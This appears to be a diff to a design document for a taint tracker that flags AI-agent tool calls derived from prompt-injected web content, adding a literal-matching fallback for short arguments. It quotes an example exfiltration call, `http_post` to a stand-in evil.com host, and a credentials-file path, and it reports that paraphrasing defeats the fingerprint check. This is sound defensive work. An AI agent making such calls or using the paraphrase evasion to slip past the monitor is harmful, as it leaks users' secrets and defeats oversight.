@@ -246,6 +246,33 @@ That one rule catches the canonical indirect-injection kill chain — fetch a po
 on it — *without needing to understand the attack text at all.* It is robust to novel phrasings,
 to languages we never trained on, and to encodings, because it never reads the semantics.
 
+### The short-argument gap, and the literal fallback
+
+**Measured during phase 08 (Task 3 review):** winnowing guarantees a match only for shared
+substrings of at least `t = K + WINDOW - 1 = 39` canonical characters, and `MIN_MATCHES = 3`
+distinct fingerprints needs roughly **50 characters** of verbatim shared text. Below that there is
+no guarantee, and below `K = 32` nothing is produced at all.
+
+That gap lands precisely on the flagship attack. Measured against a poisoned page:
+
+| tool argument | length | overlap with the page it came from |
+|---------------|--------|-----------------------------------|
+| `https://exfil.example.com/collect` | 33 | **0** |
+| `~/.aws/credentials` | 18 | **0** |
+| the same URL inside a longer command | 66 | 7 |
+
+The 33-character URL yields a fingerprint and *still* matches nothing, because the short-input
+branch emits a global minimum that is not required to be a winnowed minimum of the longer text. So
+`http_post(url="https://evil.com/collect")` — the exact action §5 exists to catch — would score zero
+matches and never fire.
+
+**Resolution:** fingerprinting alone is insufficient for short arguments. The taint tracker
+additionally extracts **distinctive literals** from untrusted content — URLs, hostnames, absolute
+paths, and credential-file paths — and stores them per session. A tool argument that contains one of
+those literals is tainted regardless of its length. Fingerprints catch reformatted prose; literals
+catch the short, high-signal strings that prose fingerprinting structurally cannot. Neither
+subsumes the other.
+
 ### Bounds and honesty
 
 - **Memory:** taint sets are capped per session (default 10k fingerprints, LRU) and dropped at
@@ -253,9 +280,14 @@ to languages we never trained on, and to encodings, because it never reads the s
 - **False positives:** an agent legitimately summarizing a fetched page into a file write *is*
   tainted, and will prompt. This is why the default verdict for taint alone is `ask`, not `deny`,
   and why side-effect classification (§6) matters — reading is not writing.
-- **Evasion:** an LLM that fully paraphrases tainted content breaks the fingerprint match. Taint is a
-  strong signal, not a proof. It is one tier of a layered system, which is exactly why the
-  deterministic detectors and the judge tier both remain.
+- **Evasion:** an LLM that fully paraphrases tainted content breaks the fingerprint match. Measured:
+  reformatting (re-wrapping, re-indenting, case changes) retains **100%** of fingerprints, while
+  paraphrasing retains **2.2%**. Taint is a strong signal, not a proof. It is one tier of a layered
+  system, which is exactly why the deterministic detectors and the judge tier both remain.
+- **Repetitive content saturates.** Distinct fingerprints cap at the text's period, not its length:
+  1.6 KB of a repeated 8-character phrase yields **one** fingerprint and can never reach
+  `MIN_MATCHES`. Task 4 therefore treats a literal match as sufficient on its own rather than
+  requiring three distinct fingerprints in all cases.
 - **This limitation must be stated in the README.** Overclaiming is how security tools lose
   credibility.
 
